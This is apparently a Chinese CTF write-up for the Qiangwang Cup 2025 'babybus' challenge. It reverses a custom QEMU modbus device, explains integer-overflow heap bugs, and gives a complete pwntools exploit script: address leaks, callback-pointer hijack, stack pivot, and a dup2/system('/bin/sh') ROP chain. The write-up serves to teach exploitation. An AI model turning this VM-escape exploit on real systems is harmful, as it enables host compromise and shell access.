---
layout: post
title: 强网杯线上赛 2025 babybus
tags: pwn qemu
---

## 题目简介

拿到附件是一个 `qemu-system-x86_64` binary 和 Dockerfile、entry script，里面这样启动了 qemu：

```sh
./qemu-system-x86_64 \
-machine none \
-nographic \
-nodefaults \
-chardev socket,id=mbus,host=0.0.0.0,port=1502,server=on,wait=off \
-device modbus-rtu,chardev=mbus,unit-id=1
```

这里没有启动一个完整的系统，只是在 1502 端口绑定了一个名为 `mbus` 的字符设备，需要我们去逆向设备的实现。使用 IDA 打开可执行文件，搜索 `modbus` 关键词：

![image.png](https://blog-1308958542.cos.ap-shanghai.myqcloud.com/20251110162113878.png)

这里的逆向过程需要对于 qemu 字符设备的理解，虽然我们没有很多经验，但可以借助 GPT 等 AI 的帮助（也可以对照 qemu 自带的其他各种字符设备的实验），比如可以问它：“在 qemu 中实现一个字符设备需要实现哪些函数？”经过一番对照，可以找到如下这个对设备 class 进行初始化的函数。qemu 虽然是 C 语言实现，但有自己的面向对象机制（QOM），这里的 `modbus_class_init` 就是 `modbus` 类的构造函数（名字是从下面这个报错信息中得知的）。

```c
__int64 __fastcall modbus_class_init(__int64 a1)
{
  __int64 v2; // [rsp+10h] [rbp-10h]

  v2 = DEVICE_CLASS(a1);
  *(_QWORD *)(v2 + 0x90) = modbus_realize;
  *(_QWORD *)(v2 + 0x98) = sub_40F7D7;
  if ( !"unit-id" )
    g_assertion_message_expr(0, "../hw/char/modbus-rtu.c", 289, "modbus_class_init", 0);
  device_class_set_props_n(v2, off_1DFD400, 2); // "chardev"
  sub_40EB4B(7, v2 + 96);
  return 0;
}
```

里面调用的 `modbus_realize` 函数非常重要（名字也来自报错信息）：

```c
__int64 __fastcall modbus_realize(__int64 a1, int a2)
{
  __int64 v2; // r9
  modbus_opaque *modbus_opaque; // [rsp+18h] [rbp-8h]

  modbus_opaque = (modbus_opaque *)modbus_cast_assert(a1);
  if ( sub_B1EEA6(&modbus_opaque->CharBackend) )
  {
    memset(modbus_opaque->regs, 0, sizeof(modbus_opaque->regs));// buffer
    modbus_opaque->count = 0;                   // size_count
    qemu_chr_fe_set_handlers(
      (__int64 *)&modbus_opaque->CharBackend,
      (__int64)modbus_can_read,
      (__int64)modbus_read,
      (__int64)modbus_event,
      0,
      (__int64)modbus_opaque,
      0,
      1);
  }
  else
  {
    error_set_internal(
      a2,
      (int)"../hw/char/modbus-rtu.c",
      263,
      (int)"modbus_realize",
      (int)"Can't create modbus-rtu device, empty char device",
      v2);
  }
  return 0;
}
```

这里绑定了 modbus 相关的诸多操作，简单逆向可知整个设备的逻辑是：

- 在 `modbus_event` 中初始化 count 为 0；
- 通过 `modbus_can_read` 检测设备缓冲区还能读多少个字符；
- 在 `modbus_read` 中读入字符放置到设备缓冲区中，调用 `resolve_modbus` 函数做具体的处理。

```c
__int64 __fastcall modbus_event(modbus_opaque *modbus_opaque, int a2)
{
  if ( a2 == 1 )                                // CHR_EVENT_OPENED
    modbus_opaque->count = 0;
  return 0;
}

__int64 __fastcall modbus_can_read(modbus_opaque *opaque)
{
  return 0x104 - (unsigned int)opaque->count;   // 0x104 - size_count
}

__int64 __fastcall modbus_read(modbus_opaque *opaque, const void *src, int size)
{
  size_t n_1; // rax
  size_t n; // [rsp+38h] [rbp-8h]

  if ( size > 0 )
  {
    n_1 = size;
    if ( 0x104LL - opaque->count <= (unsigned __int64)size )// 包最大大小为0x104
      n_1 = 0x104LL - opaque->count;
    n = n_1;
    if ( n_1 )
    {
      memcpy(&opaque->pak[opaque->count], src, n_1);
      opaque->count += n;
    }
    while ( (unsigned __int8)resolve_modbus(opaque) )
      ;
  }
  return 0;
}
```

结合 modbus 网上的相关资料逆向，`resolve_modbus` 只是实现了 modbus 协议中最常见的两种操作——读和写。modbus 由于是工控协议，相对来说比较底层，因此存在 CRC 校验码字段。我们为了写脚本和设备交互，需要自己实现一下校验码计算，只需要将计算校验码的那个函数的伪代码复制给 AI 让它用 python 实现一下就可以了。下面就可以写出几个交互函数。

```python
def calc_crc(data, endian: str = 'little') -> int:
    crc = 0xFFFF
    for b in bytes(data):
        crc ^= b
        for _ in range(8):
            crc = ((crc >> 1) ^ 0xA001) if (crc & 1) else (crc >> 1)
            crc &= 0xFFFF
    return crc

def crc_bytes(data, endian: str = 'little') -> bytes:
    return calc_crc(data).to_bytes(2, endian)

def func03(addr, quant):
    pak = b'\x01\x03' + addr.to_bytes(2, 'big') + quant.to_bytes(2, 'big')
    pak += crc_bytes(pak)
    return pak

def func10(addr, quant, data):
    pak = b'\x01\x10' + addr.to_bytes(2, 'big') + quant.to_bytes(2, 'big')
    pak += (quant*2).to_bytes(1)
    pak += data # for func03
    # for i in range(quant):
        # pak += data[i*2:i*2+2][::-1]
    pak += crc_bytes(pak)
    return pak
```

## 漏洞分析

读功能（`func03`）的实现：

![image.png](https://blog-1308958542.cos.ap-shanghai.myqcloud.com/20251110164342881.png)

```c
__int64 __fastcall func03(modbus_opaque *struct_a1, unsigned __int8 *ppak)
{
  unsigned __int64 v2; // rax
  unsigned __int8 char2D2; // [rsp+1Ch] [rbp-24h]
  unsigned __int16 i; // [rsp+1Eh] [rbp-22h]
  unsigned __int16 starting_addr; // [rsp+20h] [rbp-20h]
  unsigned __int16 quantity_of_regs; // [rsp+22h] [rbp-1Eh]
  __int16 ___0x100_______2___; // [rsp+26h] [rbp-1Ah]
  unsigned __int64 n3; // [rsp+28h] [rbp-18h]
  char *response; // [rsp+38h] [rbp-8h]

  char2D2 = *ppak;
  starting_addr = _byteswap_ushort(*((_WORD *)ppak + 1));// 大端法
  quantity_of_regs = _byteswap_ushort(*((_WORD *)ppak + 2));
  if ( quantity_of_regs && (unsigned __int16)(starting_addr + quantity_of_regs) <= 0x100u )// 整数溢出
  {
    response = (char *)g_malloc((unsigned __int8)(2 * quantity_of_regs) + 5);// 整数溢出，可以构造堆溢出
    *response = char2D2;
    response[1] = 3;
    n3 = 3;
    response[2] = 2 * quantity_of_regs;
    for ( i = 0; i < quantity_of_regs; ++i )
    {
      d = *(_WORD *)&struct_a1->regs[2 * i + 2 * starting_addr];// 一共有0x100个寄存器（每个2字节）
      response[n3] = HIBYTE(d);
      v2 = n3 + 1;
      n3 += 2LL;
      response[v2] = d;
    }
    *(_WORD *)&response[n3] = calc_crc(response, n3);
    modbus_writeout(struct_a1, (__int64)response, n3 + 2);
    g_free(response);
  }
  else
  {
    modbus_response_error(struct_a1, char2D2, 3, 2);
  }
  return 0;
}
```

- 合法性检测处的整数溢出：可以用于 leak 信息
- `malloc` 处的整数溢出：可以用于构造堆溢出（程序将会把 `starting_addr` 处的数据复制到堆上，如果可以提前控制 `starting_addr` 处的数据，就可以控制堆溢出的数据）

写功能（`func10`）的实现：

![image.png](https://blog-1308958542.cos.ap-shanghai.myqcloud.com/20251110164653514.png)

```c
__int64 __fastcall func10(modbus_opaque *struct_a1, unsigned __int8 *ppak)
{
  unsigned __int8 char2D2; // [rsp+14h] [rbp-2Ch]
  unsigned __int16 i; // [rsp+16h] [rbp-2Ah]
  unsigned __int16 starting_addr; // [rsp+18h] [rbp-28h]
  unsigned __int16 quantity_of_regs; // [rsp+1Ah] [rbp-26h]
  __int64 response[2]; // [rsp+30h] [rbp-10h] BYREF

  response[1] = __readfsqword(0x28u);
  char2D2 = *ppak;
  starting_addr = _byteswap_ushort(*((_WORD *)ppak + 1));
  quantity_of_regs = _byteswap_ushort(*((_WORD *)ppak + 2));
  if ( quantity_of_regs && (unsigned __int16)(starting_addr + quantity_of_regs) <= 0x100u )// 整数溢出
  {
    if ( ppak[6] == 2 * quantity_of_regs )
    {
      for ( i = 0; i < quantity_of_regs; ++i )
        *(_WORD *)&struct_a1->regs[2 * i + 2 * starting_addr] = (ppak[2 * i + 7] << 8) | ppak[2 * i + 8];
      response[0] = char2D2;
      BYTE1(response[0]) = 16;
      BYTE2(response[0]) = HIBYTE(starting_addr);
      BYTE3(response[0]) = starting_addr;
      BYTE4(response[0]) = HIBYTE(quantity_of_regs);
      BYTE5(response[0]) = quantity_of_regs;
      HIWORD(response[0]) = calc_crc((char *)response, 6u);
      modbus_writeout(struct_a1, (__int64)response, 8);
    }
    else
    {
      modbus_response_error(struct_a1, char2D2, 16, 3);
    }
  }
  else
  {
    modbus_response_error(struct_a1, char2D2, 16, 2);
  }
  return 0;
}
```

- 合法性检测处的整数溢出：可以把用户提供的数据写入 `starting_addr` 处（也是一个堆溢出）

## 漏洞利用

简单的思路是使用 func10 中的堆溢出进行攻击，但经过调试可以发现那里没有什么有价值的数据结构。在 qemu escape 类题型中，最有价值的数据结构是设备结构体的 `opaque` 结构，因为里面保存了这个设备的一些 callback 指针（类似与 `__free_hook`），劫持后触发调用就可以达成控制流劫持。

func03 允许我们 malloc uint8 范围内的各种内存大小。我借助 gdb 提供的 `call` 功能，将断点下在调用 `g_malloc` 处，手动调用 `call (void*)g_malloc(大小)` 来拿到各不同大小的区块地址，然后看看哪个离 `modbus` opaque 最近（有两个 block 在 opaque 前，但它和 opaque 中间隔了一个会被解引用的指针，溢出时会把它破坏掉；使用更近的那个 block 时不会有这个问题），发现是 `0xf8` 大小的区块。

可以使用 gdb 提供的 `set` 功能模拟劫持 opaque 中的函数指针，看看哪个劫持会被调用，后续溢出时就以覆盖那个指针为目标。本题中 `can_read` 和 `read` 都会被调用，因此劫持任意一个都可以。

> 注意这道题的环境非常受限，因此不涉及到堆风水，也不涉及到复杂的 ptmalloc 分配器利用技巧。

因此我的整体利用思路是：

0. 利用 func03 中的 addr 溢出，先泄漏一些有用的数据（libc 地址、程序地址、堆地址）
1. 利用 func10 中的 addr 溢出，在一个较大的 `starting_addr` 布置数据；
2. 利用 func03 中的 malloc 参数溢出，触发堆溢出，使刚才布置的数据覆盖 opaque，劫持其中的函数指针。

### 泄漏地址

```python
    s(func03(0xff9f, 0x70))

    mes = r()
    data = resolve_pak(mes)

    libc_base = unpack(data[0:8])-0x203b60
    success(f"[*] libc_base: {hex(libc_base)}")

    prog_base = unpack(data[0xa8:0xa8+8])-0x9ea35e
    success(f"[*] prog_base: {hex(prog_base)}")

    heap_base = unpack(data[0x10:0x18])-0xa4270
    success(f"[*] heap_base: {hex(heap_base)}")
```

使用 `pwndbg` 或 `gef` 提供的 `tele` 功能去 check 栈上的各种指针，找一个各类指针汇集之处来泄漏就行。

### 劫持控制流

```python
    s(func10(0xfff1, 0x20, (b'\0'+p64(char_backend)+flat([0, hijack_rip, 0, 0, hijack_rdi_rax])).ljust(0x20*2,b'\0')))
    s(func03(0xfa17, 0x5f4))
```

这里构造的大小、size 数据都需要手动计算（把约束条件都列出来，然后解不等式方程组），打了很多草稿，不重要就省略了。我首先使用 `func10` 将一些数据布置到栈上，包括：

- `char_backend` 指针：调试发现不加这个程序会炸
- `hijack_rip` 指针：覆盖 callback 函数劫持控制流
- `hijack_rdi_rax` 指针：调试的时候发现调用 callback 的时候 `rdi` 和 `rax` 会是这里的值

然后使用 func03 将布置好的数据溢出到 opaque 处，达成控制流劫持。

### get shell

题目环境比较复杂：我们是通过一个 socket 和 qemu binary 进行交互和通信而不是 stdin/stdout。因此如果直接调用 `system("/bin/sh")`，shell 子进程会继承原来的 stdin/stdout 作为其输入输出，而不是我们的那个 socket。这种情况需要我们打一个 ROP，控制程序执行 `dup(0, socket_fd); dup(1, socket_fd);` 把我们的 `socket_fd` 复制成为程序新的 stdin/stdout，然后再 `system("/bin/sh")`。

> `socket_fd` 是多少可以通过 docker 内调试拿到，这里是 10

题目使用的 glibc 版本较新，难以在仅能控制 `rip` `rdi` `rax` 的情况下做到 ROP。但没有关系，在 glibc 里猛猛找可以找到这个 gadget：

```
0x000000000016bde0 : push rax ; pop rsp ; lea rsi, [rax + 0x48] ; mov rax, qword ptr [rdi + 8] ; jmp qword ptr [rax + 0x18]
```

借助这个 gadget 可以打一个栈迁移。提前在堆某处布置数据（ROP 链）：

```python
    # 0x000000000002882f : ret
    # 0x00000000000dd237 : pop rax ; ret
    # 0x000000000010f78b : pop rdi ; ret
    # 0x0000000000110a7d : pop rsi ; ret

    payload = flat([
        libc_base + 0xdd237,
        heap_base + 0x2d6c50 + 0x10 - 0x18,
        libc_base + 0x2882f, # ret
        libc_base + 0x10f78b, 10, # pop rsi; 10
        libc_base + 0x110a7d, 0, # pop rdi; 0
        libc_base + libc.sym["dup2"],
        libc_base + 0x10f78b, 10, # pop rsi; 10
        libc_base + 0x110a7d, 1, # pop rdi; 1
        libc_base + libc.sym["dup2"],
        libc_base + 0x10f78b, prog_base + 0xD8A7D7, # pop rdi; "/bin/sh"
        libc_base + 0x2882f, # ret (for rsp align)
        libc_base + libc.sym["system"]
    ])
    s(func10(0x0, 0x6c, (b'\0'*0x11 + payload).ljust(0x6c*2, b'\0')))
    s(func03(0x2, 0x69))
    
    hijack_rip = libc_base + 0x16bde0
    hijack_rdi_rax = heap_base + 0x2d6c50
```

然后就可以拿到可交互的 shell，拿到 flag。

## 附：调试小技巧

Dockerfile 加一行：`EXPOSE 9999`

```sh
gdbserver --once 0.0.0.0:9999 ./qemu-system-x86_64 \
-machine none \
-nographic \
-nodefaults \
-chardev socket,id=mbus,host=0.0.0.0,port=1502,server=on,wait=off \
-device modbus-rtu,chardev=mbus,unit-id=1
```

![image.png](https://blog-1308958542.cos.ap-shanghai.myqcloud.com/20251110174129930.png)

## 附：完整攻击脚本

```python
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Copyright © 2025 y2 <cameudis@gmail.com>

from pwn import *
import sys
context.terminal = ['tmux', 'splitw', '-h']

# ---------------- Environment Config ---------------- #

filename = "./qemu-system-x86_64"
libc_name = "./libc.so.6"
ip = "127.0.0.1"
port = 1502

elf = ELF(filename)
libc = ELF(libc_name)

# context.log_level = 'debug'
context.binary = filename

# ------------------- Exploitation ------------------- #

ru  = lambda a:     io.recvuntil(a)
r   = lambda :      io.recv()
sla = lambda a,b:   io.sendlineafter(a,b)
sa  = lambda a,b:   io.sendafter(a,b)
sl  = lambda a:     io.sendline(a)
s   = lambda a:     io.send(a)

import socket

HOST = "127.0.0.1"
PORT = 1502

def calc_crc(data, endian: str = 'little') -> int:
    crc = 0xFFFF
    for b in bytes(data):
        crc ^= b
        for _ in range(8):
            crc = ((crc >> 1) ^ 0xA001) if (crc & 1) else (crc >> 1)
            crc &= 0xFFFF
    return crc

def crc_bytes(data, endian: str = 'little') -> bytes:
    return calc_crc(data).to_bytes(2, endian)

def big2int(n: bytes):
    num = ord(n[0])*0x100 + ord(n[1])
    return num

def resolve_pak(p: bytes):
    print(f"[*] pak to slave {hex(p[0])}, func {hex(p[1])}")
    func = p[1]
    if func == 0x03:
        big_data = p[3:-2]
        data = b""
        for i in range(0, len(big_data), 2):
            data += big_data[i+1].to_bytes(1) + big_data[i].to_bytes(1)
        print(f" Reading data: {data}")
        return data
    if func == 0x10:
        startaddr = big2int(p[2:4])
        quantity = big2int(p[4:6])
        print(f" Writing data to startaddr: {startaddr}, quantity: {quantity}")
        return null
    if func & 0x80:
        error1 = func ^ 0x80
        error2 = p[2]
        print(f" error1: {error1}, error2: {error2}")
        return null

def func03(addr, quant):
    pak = b'\x01\x03' + addr.to_bytes(2, 'big') + quant.to_bytes(2, 'big')
    pak += crc_bytes(pak)
    return pak

def func10(addr, quant, data):
    pak = b'\x01\x10' + addr.to_bytes(2, 'big') + quant.to_bytes(2, 'big')
    pak += (quant*2).to_bytes(1)
    pak += data # for func03
    # for i in range(quant):
        # pak += data[i*2:i*2+2][::-1]
    pak += crc_bytes(pak)
    return pak

def pwn():

    # leak

    s(func03(0xff9f, 0x70))

    mes = r()
    data = resolve_pak(mes)

    libc_base = unpack(data[0:8])-0x203b60
    success(f"[*] libc_base: {hex(libc_base)}")

    prog_base = unpack(data[0xa8:0xa8+8])-0x9ea35e
    success(f"[*] prog_base: {hex(prog_base)}")

    heap_base = unpack(data[0x10:0x18])-0xa4270
    success(f"[*] heap_base: {hex(heap_base)}")

    # hijack ptr in opaque

    # 0x2d5960: CharBackend offset from heap
    # 0x83c30: 0xf8 buffer
    # 0x84750: opaque

    char_backend = heap_base + 0x2d5960
    # one_gadget = libc_base + 0xef4ce

    # 0x000000000016bde0 : push rax ; pop rsp ; lea rsi, [rax + 0x48] ; mov rax, qword ptr [rdi + 8] ; jmp qword ptr [rax + 0x18]
    # 0x000000000002882f : ret
    # 0x00000000000dd237 : pop rax ; ret
    # 0x000000000010f78b : pop rdi ; ret
    # 0x0000000000110a7d : pop rsi ; ret

    payload = flat([
        libc_base + 0xdd237,
        heap_base + 0x2d6c50 + 0x10 - 0x18,
        libc_base + 0x2882f,
        libc_base + 0x10f78b, 10,
        libc_base + 0x110a7d, 0,
        libc_base + libc.sym["dup2"],
        libc_base + 0x10f78b, 10,
        libc_base + 0x110a7d, 1,
        libc_base + libc.sym["dup2"],
        libc_base + 0x10f78b, prog_base + 0xD8A7D7,
        libc_base + 0x2882f,
        libc_base + libc.sym["system"]
    ])
    s(func10(0x0, 0x6c, (b'\0'*0x11 + payload).ljust(0x6c*2, b'\0')))
    s(func03(0x2, 0x69))

    hijack_rip = libc_base + 0x16bde0
    hijack_rdi_rax = heap_base + 0x2d6c50

    s(func10(0xfff1, 0x20, (b'\0'+p64(char_backend)+flat([0, hijack_rip, 0, 0, hijack_rdi_rax])).ljust(0x20*2,b'\0')))
    s(func03(0xfa17, 0x5f4))

    r()

    io.interactive()


# ------------------ Infrastructure ------------------ #

if __name__ == "__main__":
    print("[*] Cameudis's PWN Framework")
    io = remote(ip, port)
    pwn()

```
